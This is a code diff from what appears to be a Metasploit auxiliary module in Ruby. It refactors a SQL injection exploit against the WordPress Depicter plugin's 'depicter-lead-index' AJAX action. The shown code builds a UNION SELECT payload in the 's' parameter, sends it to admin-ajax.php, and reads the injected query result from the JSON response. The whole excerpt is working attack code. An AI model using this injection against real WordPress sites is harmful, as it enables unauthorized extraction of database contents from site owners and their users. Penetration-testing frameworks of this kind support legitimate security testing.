@@ -60,27 +60,26 @@ class MetasploitModule < Msf::Auxiliary
       r1, r2, r3, r4, r5 = Array.new(5) { rand(1000..9999) }
       injected = "#{r1}') UNION SELECT #{r2},#{r3},(#{expr}),#{r4},#{r5}-- -"
 
-      endpoint = normalize_uri('wp-admin', 'admin-ajax.php')
-      params = {
-        'action' => 'depicter-lead-index',
-        's' => injected,
-        'perpage' => rand(10..50).to_s,
-        'page' => rand(1..3).to_s,
-        'orderBy' => 'source_id',
-        'order' => ['ASC', 'DESC'].sample,
-        'dateStart' => '',
-        'dateEnd' => '',
-        'sources' => ''
-      }
       res = send_request_cgi(
         'method' => 'GET',
-        'uri' => endpoint,
-        'vars_get' => params
+        'uri' => normalize_uri('wp-admin', 'admin-ajax.php'),
+        'vars_get' => {
+          'action' => 'depicter-lead-index',
+          's' => injected,
+          'perpage' => rand(10..50).to_s,
+          'page' => rand(1..3).to_s,
+          'orderBy' => 'source_id',
+          'order' => ['ASC', 'DESC'].sample,
+          'dateStart' => '',
+          'dateEnd' => '',
+          'sources' => ''
+        }
       )
-      return GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200
+
+      next GET_SQLI_OBJECT_FAILED_ERROR_MSG unless res&.code == 200
 
       extracted = res.get_json_document.dig('hits', 0, 'content', 'id')
-      return GET_SQLI_OBJECT_FAILED_ERROR_MSG if extracted.to_s.empty?
+      next GET_SQLI_OBJECT_FAILED_ERROR_MSG if extracted.to_s.empty?
 
       extracted
     end
